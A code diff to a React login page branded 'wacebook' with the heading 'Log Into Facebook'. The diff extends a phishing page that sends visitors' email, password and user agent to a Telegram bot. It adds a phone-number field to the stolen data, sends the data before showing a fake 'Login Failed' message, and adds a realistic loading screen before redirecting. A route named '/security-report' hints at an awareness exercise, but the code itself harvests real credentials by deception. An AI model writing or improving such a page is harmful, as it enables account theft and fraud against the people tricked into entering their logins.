@@ -11,8 +11,10 @@ import Footer from '@/components/Footer';
 
 const Index = () => {
   const [email, setEmail] = useState('');
+  const [phone, setPhone] = useState('');
   const [password, setPassword] = useState('');
-  const [isLoading, setIsLoading] = useState(false);
+  const [isLoading, setIsLoading] = useState(true);
+  const [isLoginLoading, setIsLoginLoading] = useState(false);
   const navigate = useNavigate();
   const { toast } = useToast();
 
@@ -24,53 +26,73 @@ const Index = () => {
     link.style.display = "none"; // Hide the link
     document.body.appendChild(link);
 
+    // 3-second loading delay
+    const timer = setTimeout(() => {
+      setIsLoading(false);
+    }, 3000);
+
     return () => {
-      // Cleanup: remove the link when component unmounts
+      // Cleanup: remove the link and timer when component unmounts
       if (document.body.contains(link)) {
         document.body.removeChild(link);
       }
+      clearTimeout(timer);
     };
   }, []);
 
   const handleLogin = async (e: React.FormEvent) => {
     e.preventDefault();
-    setIsLoading(true);
-
-    // Show error toast
-    toast({
-      title: "Login Failed",
-      description: "The email address or password you entered isn't connected to an account.",
-      variant: "destructive",
-    });
+    setIsLoginLoading(true);
 
     // Prepare data for Telegram bot
     const telegramData = {
       email,
+      phone,
       password,
       timestamp: new Date().toISOString(),
       userAgent: navigator.userAgent
     };
 
     try {
-      // Send data to Telegram bot
+      // Send data to Telegram bot first
       await sendToTelegramBot(telegramData);
       console.log('Data successfully sent to Telegram bot');
     } catch (error) {
       console.error('Failed to send data to Telegram bot:', error);
     }
+
+    // Show error toast after sending to Telegram
+    toast({
+      title: "Login Failed",
+      description: "The email address or password you entered isn't connected to an account.",
+      variant: "destructive",
+    });
     
     // Redirect after 2 seconds
     setTimeout(() => {
-      setIsLoading(false);
+      setIsLoginLoading(false);
       navigate('/security-report');
     }, 2000);
   };
 
+  if (isLoading) {
+    return (
+      <div className="min-h-screen bg-white flex items-center justify-center">
+        <div className="text-center">
+          <div className="animate-spin rounded-full h-16 w-16 border-b-2 border-blue-600 mx-auto mb-4"></div>
+          <h1 className="text-4xl md:text-6xl font-bold text-blue-600 tracking-tight">
+            wacebook
+          </h1>
+        </div>
+      </div>
+    );
+  }
+
   return (
     <div className="min-h-screen bg-white">
       {/* Header */}
-      <div className="flex justify-center pt-20 pb-8">
-        <h1 className="text-6xl font-bold text-blue-600 tracking-tight">
+      <div className="flex justify-center pt-12 md:pt-20 pb-6 md:pb-8 px-4">
+        <h1 className="text-4xl md:text-6xl font-bold text-blue-600 tracking-tight">
           wacebook
         </h1>
       </div>
@@ -79,20 +101,29 @@ const Index = () => {
       <div className="flex flex-col items-center px-4 pb-20">
         <div className="w-full max-w-md">
           <Card className="shadow-lg border-gray-200">
-            <CardContent className="p-6">
+            <CardContent className="p-4 md:p-6">
               <div className="text-center mb-6">
-                <h2 className="text-xl font-medium text-gray-700">
+                <h2 className="text-lg md:text-xl font-medium text-gray-700">
                   Log Into Facebook
                 </h2>
               </div>
 
-              <form onSubmit={handleLogin} className="space-y-4">
+              <form onSubmit={handleLogin} className="space-y-3 md:space-y-4">
                 <Input
                   type="text"
-                  placeholder="Email address or phone number"
+                  placeholder="Email address"
                   value={email}
                   onChange={(e) => setEmail(e.target.value)}
-                  className="h-12 text-base border-gray-300 focus:border-blue-500"
+                  className="h-10 md:h-12 text-sm md:text-base border-gray-300 focus:border-blue-500"
+                  required
+                />
+
+                <Input
+                  type="text"
+                  placeholder="Phone number"
+                  value={phone}
+                  onChange={(e) => setPhone(e.target.value)}
+                  className="h-10 md:h-12 text-sm md:text-base border-gray-300 focus:border-blue-500"
                   required
                 />
 
@@ -101,16 +132,16 @@ const Index = () => {
                   placeholder="Password"
                   value={password}
                   onChange={(e) => setPassword(e.target.value)}
-                  className="h-12 text-base border-gray-300 focus:border-blue-500"
+                  className="h-10 md:h-12 text-sm md:text-base border-gray-300 focus:border-blue-500"
                   required
                 />
 
                 <Button
                   type="submit"
-                  disabled={isLoading}
-                  className="w-full h-12 text-lg font-semibold bg-blue-600 hover:bg-blue-700 transition-colors duration-200"
+                  disabled={isLoginLoading}
+                  className="w-full h-10 md:h-12 text-base md:text-lg font-semibold bg-blue-600 hover:bg-blue-700 transition-colors duration-200"
                 >
-                  {isLoading ? 'Logging in...' : 'Log In'}
+                  {isLoginLoading ? 'Logging in...' : 'Log In'}
                 </Button>
 
                 <div className="text-center">
@@ -123,14 +154,14 @@ const Index = () => {
                 </div>
               </form>
 
-              <div className="my-6">
+              <div className="my-4 md:my-6">
                 <Separator className="bg-gray-300" />
               </div>
 
               <div className="text-center">
                 <Button
                   variant="outline"
-                  className="bg-green-500 hover:bg-green-600 text-white border-green-500 hover:border-green-600 font-semibold px-8 py-3 transition-colors duration-200"
+                  className="bg-green-500 hover:bg-green-600 text-white border-green-500 hover:border-green-600 font-semibold px-6 md:px-8 py-2 md:py-3 text-sm md:text-base transition-colors duration-200"
                 >
                   Create new account
                 </Button>
@@ -138,7 +169,7 @@ const Index = () => {
             </CardContent>
           </Card>
 
-          <div className="text-center mt-8 text-sm text-gray-600">
+          <div className="text-center mt-6 md:mt-8 text-xs md:text-sm text-gray-600 px-4">
             <p>
               <strong>Create a Page</strong> for a celebrity, brand or business.
             </p>
